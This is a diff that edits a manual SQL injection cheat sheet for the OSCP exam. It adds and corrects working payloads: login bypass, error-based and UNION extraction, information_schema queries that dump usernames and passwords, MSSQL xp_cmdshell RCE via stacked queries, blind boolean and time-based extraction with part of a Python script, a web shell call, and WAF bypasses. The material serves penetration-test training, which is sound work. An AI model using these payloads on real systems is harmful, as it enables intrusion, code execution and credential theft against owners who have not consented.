@@ -10,6 +10,7 @@ The OSCP exam prohibits SQLmap, so perform all SQL injection manually.
 
 - Source: https://heretek.dev/oscp-cheatsheet/sql-injection/ (Jean Romero) — reconstructed
 - Variables: `$TARGET` = target host, `$ATTACKER` = attacker (Kali) IP (`ATTACKER_IP` in the body means the same thing)
+- Placeholders such as `TARGET`, `IP`, `ATTACKER`, `ATTACKER_IP`, and `KALI` are literal stand-ins — replace them with real addresses before running.
 
 ## How it works
 
@@ -19,7 +20,7 @@ The app pastes user input straight into the SQL query. If you enter `offsec` in 
 SELECT username,password FROM users WHERE username='offsec' AND password='hashed_pass';
 ```
 
-Adding one more quote, like `offsec'`, breaks the query and produces a DB error. That means you can control the query.
+Adding one more quote, like `offsec'`, breaks the query and usually produces a DB error or a visibly different response. That is a sign that user input reaches the query.
 
 If you enter `offsec' or 1=1;-- -`, the query changes to:
 
@@ -51,9 +52,9 @@ Manual testing in Burp Repeater:
 
 What to look for in responses:
 
-- DB error message → error-based SQLi
-- Successful login or change in page content → in-band SQLi (try UNION)
-- No change → test for blind SQLi
+- DB error message → injection point confirmed; try error-based extraction
+- Successful login or change in page content → the query result is visible; try UNION
+- No visible change → test for blind SQLi
 
 ## Step 2 — Identify the DBMS
 
@@ -70,19 +71,19 @@ Comment syntax:
 - PostgreSQL: `--` — e.g., `' or 1=1--`
 
 - MySQL requires a space after `--`. Using `-- -` is safe. MSSQL/PostgreSQL don't need an extra `-`.
-- In URL-encoded POST data, spaces become `+`. In Burp, `-- -` is written as `--+-`.
+- In URL-encoded bodies, a space becomes `+`, so `-- -` is sent as `--+-`. In Burp Repeater's raw view you can type the space directly.
 
 ## Step 3 — Choose an attack method
 
 - Error-based: when error messages are shown on the page — fast
 - UNION-based: when the app displays query results on the page — fast
-- Stacked queries: run a second statement with `;` (verify with WAITFOR/SLEEP) — on MSSQL, leads straight to RCE (common)
+- Stacked queries: run a second statement with `;` (verify with `WAITFOR`/`SLEEP`) — on MSSQL this can lead straight to RCE when `xp_cmdshell` is available
 - Boolean blind: the page changes but no errors or data are visible — slow
 - Time-based blind: no visible change at all — slowest
 
 - If it's MSSQL (IIS + ASP.NET + SqlClient), check stacked queries first: `'; WAITFOR DELAY '0:0:5'--`. If it works, skip the rest and go straight to xp_cmdshell.
 
-Before committing to one attack method, run all of the detection checklist below. In 5 minutes and 7 tests, it shows exactly what works.
+Before committing to one attack method, run the 7-test checklist below. It quickly shows which methods work and which are blocked.
 
 ## SQLi detection checklist (run all 7 tests before committing to an attack)
 
@@ -90,24 +91,25 @@ Before committing to one attack method, run all of the detection checklist below
 
 Enter `'` into the field. Does the app break, show an error, or behave differently?
 
-- Success → injectable. Continue.
-- Failure → try `"`, `\`, `1 OR 1=1`, `)`. If nothing breaks, injection is probably not possible.
+- Error or different response → injectable; continue.
+- No change → try `"`, `\`, `1 OR 1=1`, and `)`.
+- If none of these change the response, injection is unlikely — still try the blind tests below before giving up.
 
 ### Test 2 — Authentication bypass
 
-Can you log in? If yes, you're done.
+Can you log in? If yes, the injection works — record the payload before moving on.
 
 ### Test 3 — Error-based (check the response from Test 1)
 
 Did the `'` test show a DB error message on the page? If so:
 
 ```text
-MySQL:  ' OR 1=1 IN (SELECT version())-- -
-MSSQL:  ' AND 1=cast((SELECT DB_NAME()) AS int)--
+MySQL:    ' AND extractvalue(1,concat(0x3a,version()))-- -
+MSSQL:    ' AND 1=cast((SELECT DB_NAME()) AS int)--
 Postgres: ' AND 1=cast((SELECT version()) AS int)--
 ```
 
-If the error message reveals the version or DB name, error-based works. Use it.
+If the returned error contains the version or DB name, error-based extraction works.
 
 ### Test 4 — UNION-based
 
@@ -182,13 +184,12 @@ SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
 
 ## Error-based SQLi
 
-```sql
-' or 1=1 in (SELECT version())-- -
-' or 1=1 in (SELECT database())-- -
-' or 1=1 in (SELECT schema_name FROM information_schema.schemata LIMIT 0,1)-- -
-' or 1=1 in (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)-- -
-' or 1=1 in (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)-- -
-' or 1=1 in (SELECT group_concat(username,';',password SEPARATOR '\n\n') FROM users)-- -
+Start with a DBMS-specific error that leaks a value, then use the subsections below to extract data.
+
+```text
+MySQL:    ' AND extractvalue(1,concat(0x3a,database()))-- -
+MSSQL:    ' AND 1=cast((SELECT DB_NAME()) AS int)--
+Postgres: ' AND 1=cast((SELECT version()) AS int)--
 ```
 
 ### MySQL — extractvalue()
@@ -321,16 +322,26 @@ SQLite:
 
 ## information_schema cheat sheet
 
-MySQL and PostgreSQL:
+MySQL:
 
 - All DBs: `SELECT schema_name FROM information_schema.schemata`
+- Table count: `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()`
 - Tables in the current DB: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
-- Columns of a table: `SELECT column_name FROM information_schema.columns WHERE table_name='users'`
-- Dump data: `SELECT group_concat(user,';',passwd SEPARATOR '\n\n') FROM users`
+- Columns: `SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users'`
+- Dump data: `SELECT group_concat(username,';',password SEPARATOR '\n\n') FROM users`
+
+PostgreSQL:
+
+- All DBs: `SELECT datname FROM pg_database`
+- Table count: `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public'`
+- Tables in the current schema: `SELECT table_name FROM information_schema.tables WHERE table_schema='public'`
+- Columns: `SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'`
+- Dump data: `SELECT string_agg(username || ';' || password, chr(10)) FROM users`
 
 MSSQL (system tables are different):
 
 - All DBs: `SELECT name FROM master..sysdatabases`
+- Table count: `SELECT COUNT(name) FROM sysobjects WHERE xtype='U'`
 - Tables: `SELECT name FROM sysobjects WHERE xtype='U'`
 - Columns: `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')`
 
@@ -356,7 +367,7 @@ Execute: `http://TARGET/shell.php?cmd=whoami`
 
 ## Stacked Queries — MSSQL RCE (xp_cmdshell)
 
-MSSQL can run multiple statements separated by `;`. MySQL can't in most PHP apps.
+MSSQL can run multiple statements separated by `;`. MySQL/PHP setups usually reject stacked statements because the driver executes only one statement.
 
 Detection: `'; WAITFOR DELAY '0:0:5'--` → a 5-second delay means stacked queries work.
 
@@ -416,6 +427,8 @@ Requires the `superuser` role. Check with `\du` in psql.
 
 ## Blind SQLi — boolean-based
 
+MySQL syntax is shown below. For MSSQL use `SUBSTRING(DB_NAME(),1,1)`; for PostgreSQL use `substring(current_database(),1,1)`.
+
 Confirm: `offsec' or 1=1-- -` vs `offsec' or 1=2-- -` → do the pages differ?
 
 Extract one character at a time:
@@ -444,6 +457,8 @@ offsec'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 
 ## Blind SQLi — Python script (SQLmap is prohibited)
 
+The two scripts below use MySQL syntax (`SUBSTRING`, `LIMIT`, `IF`, `SLEEP`). Swap the inner query and time function for the target DBMS using the payloads above.
+
 Boolean-based extractor:
 
 ```text
@@ -451,7 +466,7 @@ Boolean-based extractor:
 import requests, string
 
 url = "http://TARGET/login.php"
-true_indicator = "Welcome"
+true_indicator = "Welcome"   # must appear only in the TRUE response
 charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+.,;:"
 extracted = ""
 
@@ -507,7 +522,7 @@ Time payloads per DB:
 
 - MySQL: `IF(condition,SLEEP(3),0)`
 - MSSQL: `IF(condition) WAITFOR DELAY '0:0:3'`
-- PostgreSQL: `CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END`
+- PostgreSQL: `SELECT CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END`
 
 ## Filter / WAF bypass
 
@@ -521,7 +536,7 @@ Time payloads per DB:
 -- Quotes blocked? Use hex
 ... WHERE table_name=0x7573657273              (hex for 'users')
 
--- AND/OR blocked?
+-- AND/OR blocked? URL-encode & as %26 in HTTP bodies
 ' && 1=1-- -
 ' || 1=1-- -
 
